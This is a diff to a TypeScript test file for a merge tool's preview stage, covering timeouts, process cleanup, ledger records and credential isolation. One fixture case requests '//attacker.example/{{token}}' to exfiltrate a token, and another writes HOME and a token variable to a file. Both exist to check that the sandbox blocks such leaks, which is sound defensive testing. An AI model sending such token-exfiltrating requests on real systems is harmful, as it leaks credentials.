@@ -3,7 +3,7 @@ import assert from 'node:assert/strict';
 import { createHash } from 'node:crypto';
 import { execFileSync } from 'node:child_process';
 import { existsSync } from 'node:fs';
-import { mkdir, readdir, realpath, rm, writeFile } from 'node:fs/promises';
+import { mkdir, readFile, readdir, realpath, rm, writeFile } from 'node:fs/promises';
 import { join } from 'node:path';
 import { mergeOne, mergeRecordKey, mergeRecordKinds, type MergePorts, type MergeRecordEvent, type MergeTrialRun } from '../src/merge-writer/executor.js';
 import { previewCheckoutPrefix, previewConcurrency, previewFailureReason, previewSkip, previewSlots, runPreview, sweepPreviewCheckouts, type PreviewSite, type PreviewVerdict } from '../src/merge-writer/preview.js';
@@ -14,7 +14,7 @@ import { trialFailedGround, trialFailurePrefix } from '../src/model/rework-groun
 import { masterConfigSchema } from '../src/master.js';
 import { tempOwnerMarker, writeTempOwner } from '../src/tmp-reclaim.js';
 import type { Work } from '../src/model.js';
-import type { StaticBuildShell } from '../src/release-project.js';
+import { buildStaticSite, type StaticBuildShell } from '../src/release-project.js';
 import { loadCases } from '../src/e2e/case.js';
 import { runCases } from '../src/e2e/runner.js';
 import { temporaryDirectory } from './helpers/temp-dirs.js';
@@ -50,6 +50,8 @@ const previewDirectories = async (base: string) => (await readdir(base)).filter(
 
 // ---- mergeOne against fake ports -----------------------------------------------------------------
 
+// The fixtures' one fixed now: no instant here is compared with the wall clock.
+const fixedNow = 1_893_456_000_000, fixedAt = new Date(fixedNow).toISOString();
 const tip = sha('tip'), head = sha('head'), mergeSha = sha('merge');
 const work = (files: string[] = ['src/game.ts']) => ({
   id: 'w1', key: 'GY-1', description: '', type: 'feature', priority: 1, dependencies: [], criteria: [{ id: 'AC-1', text: 'Works', proofs: ['unit:works'] }],
@@ -61,7 +63,7 @@ const passingTrial: MergeTrialRun = { build: 'pass', tests: { passed: 3, failed:
 function ports(preview?: MergePorts['preview']) {
   const events: MergeRecordEvent[] = [], pushes: string[] = [];
   const value: MergePorts = {
-    baseBranch: 'main', retrials: 1, now: () => Date.parse('2030-01-01T00:00:00Z'),
+    baseBranch: 'main', retrials: 1, now: () => fixedNow,
     fetch: async () => pushes.length ? mergeSha : tip,
     merge: async () => ({ mergeSha, files: ['src/game.ts'] }),
     trial: async () => passingTrial,
@@ -107,6 +109,39 @@ test('unit:preview-failing-case-refuses-merge — a static-site repository\'s pa
   assert.equal((await mergeOne(failingTrial.value, work())).outcome, 'refused');
   assert.equal(previewed, 0, 'only a passing trial is previewed');
   assert.match(previewFailureReason({ ...failed, failed: ['build'], detail: 'the static site\'s build `x` failed' }, trialFailurePrefix)!, /^trial failed: preview build/);
+
+  // A required case declaring an install secret is selected but not run: the verdict records it unrun, naming why, beside the cases that ran.
+  const secretOnly = await repository('preview-secret-only', 42, [{ id: 'checkout', title: 'A player pays', tags: ['api'], target: 'any', required: true, secrets: ['STRIPE_KEY'],
+    steps: [{ kind: 'http', method: 'GET', path: '/{{secret:STRIPE_KEY}}', status: 200 }] }]);
+  const withheld = await runPreview({ root: secretOnly.repo, base: secretOnly.base, mergeSha: secretOnly.mergeSha, site, timeoutMs: 30_000, stepTimeoutMs: 5_000 });
+  assert.equal(withheld.result, 'pass', withheld.detail);
+  const recordedUnrun = withheld.cases.find(entry => entry.case === 'checkout');
+  assert.deepEqual(recordedUnrun && [recordedUnrun.verdict, recordedUnrun.required], ['unrun', true], 'the required case is recorded, not dropped');
+  assert.match(recordedUnrun!.reason!, /STRIPE_KEY.*withholds.*release candidate/);
+  assert.match(withheld.detail, /not run on the preview.*checkout \(required\)/);
+
+  // The merge's own case file that does not load fails the preview, recorded and refused as a failed trial, never thrown past the record.
+  const malformed = await repository('preview-malformed', 42);
+  await writeFile(join(malformed.repo, 'e2e', 'cases', 'broken.json'), '{ not json');
+  git(malformed.repo, 'add', '-A'); git(malformed.repo, 'commit', '-q', '-m', 'a broken case');
+  const unloadable = await runPreview({ root: malformed.repo, base: malformed.base, mergeSha: git(malformed.repo, 'rev-parse', 'HEAD'), site, timeoutMs: 30_000, stepTimeoutMs: 5_000 });
+  assert.equal(unloadable.result, 'fail', unloadable.detail);
+  assert.deepEqual(unloadable.failed, ['cases']);
+  assert.match(unloadable.detail, /E2E cases do not load/);
+  assert.deepEqual(await previewDirectories(malformed.base), []);
+  const refusedUnloadable = ports(async () => unloadable);
+  const unloadableOutcome = await mergeOne(refusedUnloadable.value, work());
+  assert.equal(unloadableOutcome.outcome, 'refused');
+  assert.match((unloadableOutcome as { reason: string }).reason, /^trial failed: preview: the merge's E2E cases do not load/);
+  assert.deepEqual(refusedUnloadable.events.map(event => event.kind), ['intent', 'trial', 'refused']);
+  // A preview port that throws is recorded as one that could not run and refused, the head left queued: no intent is left open.
+  const throwing = ports(async () => { throw new Error('git worktree add failed: disk full'); });
+  const thrown = await mergeOne(throwing.value, work());
+  assert.equal(thrown.outcome, 'requeued', JSON.stringify(thrown));
+  assert.deepEqual(throwing.events.map(event => event.kind), ['intent', 'trial', 'refused']);
+  assert.equal((throwing.events[1] as { preview?: PreviewVerdict }).preview?.result, 'error');
+  assert.match((throwing.events[2] as { reason: string }).reason, /could not run: git worktree add failed: disk full/);
+  assert.deepEqual(throwing.pushes, []);
 });
 
 test('unit:preview-skipped-when-not-applicable — a merge of only docs or tests, and a repository naming no static UAT, skip the preview and merge exactly as before', async () => {
@@ -170,7 +205,7 @@ test('unit:preview-capped-and-cleaned-up — at most two previews run at once; e
   // Timeout in the build: the build is cancelled, and its late continuation still holds the slot and the checkout until it ends.
   const timeoutSlots = previewSlots();
   let buildCancelled = false, buildEnded = false;
-  const lateBuild = runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, timeoutMs: 1_000, slots: timeoutSlots,
+  const lateBuild = runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, timeoutMs: 3_000, slots: timeoutSlots,
     shell: async (_command, cwd, signal) => {
       await new Promise<void>(accept => signal!.addEventListener('abort', () => accept(), { once: true }));
       buildCancelled = true;
@@ -183,7 +218,7 @@ test('unit:preview-capped-and-cleaned-up — at most two previews run at once; e
     } });
   const timedOut = await lateBuild;
   assert.equal(timedOut.result, 'timeout');
-  assert.ok(buildCancelled && buildEnded, 'the timed-out build was cancelled and had ended before the preview answered');
+  assert.ok(buildCancelled && buildEnded, `the timed-out build was cancelled and had ended before the preview answered: ${timedOut.detail}`);
   assert.equal(timeoutSlots.running, 0);
   assert.deepEqual(await previewDirectories(fixture.base), [], 'a timed-out preview\'s checkout is removed');
   // Timeout in the cases: in-flight requests are aborted, no further case or retry starts, and the run ends before the slot is freed.
@@ -206,12 +241,28 @@ test('unit:preview-capped-and-cleaned-up — at most two previews run at once; e
   assert.equal((await mergeOne(requeue.value, work())).outcome, 'requeued');
   assert.equal(git(fixture.repo, 'worktree', 'list').split('\n').length, 1, 'git keeps no record of any preview checkout');
 
+  // The default build shell kills the build's whole process group, descendants included, on cancellation and at its timeout.
+  const buildDirectory = await scratch('preview-build-group');
+  for (const [label, cancelAfter] of [['cancelled', 300], ['timed-out', 0]] as const) {
+    const orphan = join(buildDirectory, `${label}-orphan`);
+    const controller = new AbortController();
+    if (cancelAfter) setTimeout(() => controller.abort(), cancelAfter);
+    const buildFailed = await buildStaticSite(`(sleep 3 && touch ${orphan}) & sleep 30`, buildDirectory, cancelAfter ? 30_000 : 500, undefined, controller.signal, { PATH: process.env.PATH! });
+    assert.ok(buildFailed, `the ${label} build fails`);
+    let left = '';
+    try { left = execFileSync('pgrep', ['-f', `touch ${orphan}`], { encoding: 'utf8' }).trim(); } catch { /* pgrep exits 1 when nothing matches */ }
+    assert.equal(left, '', `no descendant of the ${label} build outlives it`);
+  }
+  await new Promise(accept => setTimeout(accept, 3_500));
+  for (const label of ['cancelled', 'timed-out']) assert.equal(existsSync(join(buildDirectory, `${label}-orphan`)), false, `the ${label} build's background child never ran on`);
+  assert.equal(await buildStaticSite('echo built', buildDirectory, 5_000), null, `a build exiting zero passes (${existsSync(buildDirectory)})`);
+
   // The startup sweep: a fabricated leftover whose owner is gone goes; a live owner's and an unmarked one stay.
   const base = await scratch('preview-sweep'), proc = await scratch('preview-proc');
   const dead = join(base, `${previewCheckoutPrefix}dead`), live = join(base, `${previewCheckoutPrefix}live`), unmarked = join(base, `${previewCheckoutPrefix}unmarked`), other = join(base, 'trial-other');
   for (const directory of [dead, live, unmarked, other]) { await mkdir(join(directory, 'checkout'), { recursive: true }); await writeFile(join(directory, 'checkout', 'index.html'), 'left behind'); }
-  await writeFile(tempOwnerMarker(dead), `${JSON.stringify({ pid: 4_194_000, startedAt: 1, at: '2030-01-01T00:00:00Z' })}\n`);
-  await writeFile(tempOwnerMarker(other), `${JSON.stringify({ pid: 4_194_000, startedAt: 1, at: '2030-01-01T00:00:00Z' })}\n`);
+  await writeFile(tempOwnerMarker(dead), `${JSON.stringify({ pid: 4_194_000, startedAt: 1, at: fixedAt })}\n`);
+  await writeFile(tempOwnerMarker(other), `${JSON.stringify({ pid: 4_194_000, startedAt: 1, at: fixedAt })}\n`);
   await writeTempOwner(live);
   await mkdir(join(proc, String(process.pid)));
   await writeFile(join(proc, String(process.pid), 'stat'), (await import('node:fs')).readFileSync(`/proc/${process.pid}/stat`, 'utf8'));
@@ -221,12 +272,14 @@ test('unit:preview-capped-and-cleaned-up — at most two previews run at once; e
 });
 
 test('unit:preview-holds-no-coordinator-credential — the merge\'s build runs with the host basics only, its cases with a throwaway token whose requests stay on the served origin, and a cancelled preview kills its command steps\' processes', { timeout: 60_000 }, async () => {
-  // The build: a candidate's build script sees PATH and HOME, never the coordinator's credentials.
-  const fixture = await repository('preview-isolated', 42, [{ id: 'leak', title: 'A case reaching for another host', tags: ['api'], target: 'uat', required: true,
+  // The build and the cases' processes: a candidate's script sees PATH and a throwaway HOME, never the coordinator's credentials, home or runtime sockets.
+  const seen = join(await scratch('preview-seen'), 'environment');
+  const fixture = await repository('preview-isolated', 42, [{ id: 'environment', title: 'A command reading its environment', tags: ['api'], target: 'uat', required: false,
+    steps: [{ kind: 'command', run: `printf '%s|%s|%s|%s' "$HOME" "$XDG_RUNTIME_DIR" "$XDG_CONFIG_HOME" "$GRAPHYARD_UAT_TOKEN" > ${seen}`, timeoutSeconds: 30 }] },{ id: 'leak', title: 'A case reaching for another host', tags: ['api'], target: 'uat', required: true,
     steps: [{ kind: 'http', method: 'GET', path: '//attacker.example/{{token}}', status: 200 }] },
   { id: 'needs-secret', title: 'A case declaring an install secret', tags: ['api'], target: 'uat', required: true, secrets: ['API_KEY'],
     steps: [{ kind: 'http', method: 'GET', path: '/{{secret:API_KEY}}', status: 200 }] }]);
-  const host = { PATH: process.env.PATH, HOME: '/home/builder', GRAPHYARD_UAT_TOKEN: 'uat-secret', GITHUB_TOKEN: 'gh-secret', GRAPHYARD_TOKEN: 'gy-secret' };
+  const host = { PATH: process.env.PATH, HOME: '/home/builder', XDG_RUNTIME_DIR: '/run/user/1000', DISPLAY: ':0', GRAPHYARD_UAT_TOKEN: 'uat-secret', GITHUB_TOKEN: 'gh-secret', GRAPHYARD_TOKEN: 'gy-secret' };
   let buildEnvironment: NodeJS.ProcessEnv | undefined;
   const recordingShell: StaticBuildShell = async (command, cwd, _signal, env) => { buildEnvironment = env; return copySite(command, cwd); };
   const requested: { url: string; authorization: string }[] = [];
@@ -235,13 +288,20 @@ test('unit:preview-holds-no-coordinator-credential — the merge\'s build runs w
     return fetch(input, init);
   };
   const verdict = await runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, timeoutMs: 30_000, stepTimeoutMs: 5_000, shell: recordingShell, fetcher: recordingFetcher, hostEnvironment: host });
-  assert.deepEqual(buildEnvironment, { PATH: process.env.PATH, HOME: '/home/builder' }, 'the build holds no coordinator credential');
+  const home = buildEnvironment?.HOME ?? '';
+  assert.ok(home.startsWith(join(fixture.base, previewCheckoutPrefix)) && home.endsWith('/home'), `the build's HOME is the preview's own: ${home}`);
+  assert.deepEqual(buildEnvironment, { PATH: process.env.PATH, PLAYWRIGHT_BROWSERS_PATH: '/home/builder/.cache/ms-playwright', HOME: home, XDG_CONFIG_HOME: join(home, '.config'), XDG_CACHE_HOME: join(home, '.cache'),
+    XDG_DATA_HOME: join(home, '.local', 'share'), XDG_STATE_HOME: join(home, '.local', 'state'), TMPDIR: join(home, 'tmp') }, 'the build holds no coordinator credential, home, runtime directory or display');
+  const [caseHome, runtime, config, token] = (await readFile(seen, 'utf8')).split('|');
+  // XDG_CONFIG_HOME unset falls back to the throwaway HOME's own .config.
+  assert.deepEqual([caseHome, runtime, config, token], [home, '', '', ''], 'a command case runs in the same throwaway home, with no runtime directory or token');
+  assert.ok(!existsSync(home), 'the throwaway home is removed with the checkout');
   assert.equal(verdict.result, 'fail', verdict.detail);
   assert.deepEqual(verdict.failed, ['leak'], 'a case leaving the served origin fails without sending its request');
   assert.ok(requested.length > 0 && requested.every(request => new URL(request.url).hostname === '127.0.0.1'), JSON.stringify(requested));
   assert.ok(requested.every(request => !/uat-secret|gh-secret|gy-secret/.test(request.authorization)), 'no coordinator token is sent');
   assert.ok(requested.some(request => /^Bearer preview-/.test(request.authorization)), 'the cases carry the preview\'s own token');
-  assert.ok(!verdict.cases.some(entry => entry.case === 'needs-secret'), 'a case declaring an install secret is not run on the preview');
+  assert.equal(verdict.cases.find(entry => entry.case === 'needs-secret')?.verdict, 'unrun', 'a case declaring an install secret is not run on the preview');
   // And a run that withholds secrets never hands one to a case, though the install's file holds it.
   const secrets = await scratch('preview-secrets');
   await writeFile(join(secrets, 'e2e-secrets.uat.env'), 'API_KEY=install-secret\n', { mode: 0o600 });
@@ -278,7 +338,7 @@ test('unit:preview-verdict-recorded — the preview verdict is recorded with the
   // The fold keeps it on work.mergeLedger.trial, which `graphyard status` prints with the item.
   const { kind: _kind, ...payload } = trial;
   const ledger = foldMergeLedger([
-    { kind: mergeLedgerKinds.intent, payload: { key: 'GY-1', head, baseTip: tip, mergeSha, risk: 'normal', at: '2030-01-01T00:00:00Z' } },
+    { kind: mergeLedgerKinds.intent, payload: { key: 'GY-1', head, baseTip: tip, mergeSha, risk: 'normal', at: fixedAt } },
     { kind: mergeTrialKind, payload },
     { kind: mergeLedgerKinds.refused, payload: { head, reason: previewFailureReason(verdict, trialFailurePrefix), kind: 'merge' } },
   ]);
@@ -286,7 +346,7 @@ test('unit:preview-verdict-recorded — the preview verdict is recorded with the
   assert.equal(ledger['GY-1']!.state, 'refused');
   // A trial without a preview folds as it always did.
   const { preview: _preview, ...plain } = payload as typeof payload & { preview?: unknown };
-  const bare = foldMergeLedger([{ kind: mergeLedgerKinds.intent, payload: { key: 'GY-1', head, baseTip: tip, mergeSha, risk: 'normal', at: '2030-01-01T00:00:00Z' } }, { kind: mergeTrialKind, payload: plain }]);
+  const bare = foldMergeLedger([{ kind: mergeLedgerKinds.intent, payload: { key: 'GY-1', head, baseTip: tip, mergeSha, risk: 'normal', at: fixedAt } }, { kind: mergeTrialKind, payload: plain }]);
   assert.equal('preview' in bare['GY-1']!.trial!, false);
 });
 
@@ -305,7 +365,7 @@ test('unit:preview-timeout-retried — a head whose preview timed out is merged 
   let commits = 0, previews = 0, landed: string | null = null;
   const verdictFor = (merged: string, result: PreviewVerdict['result']): PreviewVerdict => ({ result, mergeSha: merged, cases: [], failed: [], detail: result, durationMs: 5 });
   const value: MergePorts = {
-    baseBranch: 'main', retrials: 1, now: () => Date.parse('2030-01-01T00:00:00Z') + commits * 60_000,
+    baseBranch: 'main', retrials: 1, now: () => fixedNow + commits * 60_000,
     fetch: async () => landed ?? tip,
     // commit-tree stamps the time, so each trial of the same head on the same tip is a fresh merge commit.
     merge: async () => ({ mergeSha: sha(`merge-${++commits}`), files: ['src/game.ts'] }),
